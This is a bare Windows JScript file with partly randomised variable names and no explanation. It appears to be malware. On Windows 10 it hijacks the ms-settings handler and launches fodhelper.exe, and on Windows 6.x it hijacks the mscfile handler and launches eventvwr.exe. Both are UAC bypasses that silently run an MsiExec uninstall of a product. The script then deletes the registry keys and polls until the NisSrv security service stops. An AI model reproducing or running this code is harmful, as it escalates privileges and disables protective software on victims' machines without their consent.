function isServiceRunning(serviceName) {
    var winmgmtsObject = GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_Service WHERE Name=+serviceName+");
    var utlxfzud = new Enumerator(winmgmtsObject);
    var bqijutotpzpmc = utlxfzud.item();
    var processState = "";
    try {
        processState = bqijutotpzpmc.State;
    } catch (e) {}
    return (processState == "Running") ? true : false;
}

var nisSrvLbl = "NisSrv";
var wScriptShellApplication = WScript.CreateObject("shell.application");
var activeXObjectShell = new ActiveXObject("WScript.Shell");
var getObjWinmgmtsCIMV2 = GetObject("winmgmts:\\\\.\\root\\CIMV2");
var lsiicx = getObjWinmgmtsCIMV2.ExecQuery(
    "SELECT * FROM Win32_OperatingSystem",
    "WQL",
    48
);
var zynhqkeg = new Enumerator(lsiicx);
var enumItem = zynhqkeg.item();
var sysDirObj = enumItem.SystemDirectory;
var versionObj = enumItem.Version;
var arr = versionObj.split(".");
if (arr[0] == "10") {
    activeXObjectShell.RegWrite(
        "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\",
        "MsiExec.exe /X{2AA3C13E-0531-41B8-AE48-AE28C940A809} ACCEPT=YES /qr+ /quiet",
        "REG_SZ"
    );
    activeXObjectShell.RegWrite(
        "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute",
        "",
        "REG_SZ"
    );
    wScriptShellApplication.ShellExecute(
        "explorer.exe",
        sysDirObj + "fodhelper.exe",
        "",
        "open",
        0
    );
    WScript.sleep(1e4);
    activeXObjectShell.RegDelete(
        "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\"
    );
} else {
    if (arr[0] == "6") {
        activeXObjectShell.RegWrite(
            "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\",
            "MsiExec.exe /X{2AA3C13E-0531-41B8-AE48-AE28C940A809} ACCEPT=YES /qr+ /quiet",
            "REG_SZ"
        );
        wScriptShellApplication.ShellExecute(
            "explorer.exe",
            sysDirObj + "\\eventvwr.exe",
            "",
            "open",
            0
        );
        WScript.sleep(1e4);
        activeXObjectShell.RegDelete(
            "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\"
        );
    }
}
var iii = 0;
while (true) {
    if (isServiceRunning(nisSrvLbl)) {
        WScript.sleep(100);
    } else {
        break;
    }
    iii = iii + 1;
    if (iii == 900) {
        break;
    }
}
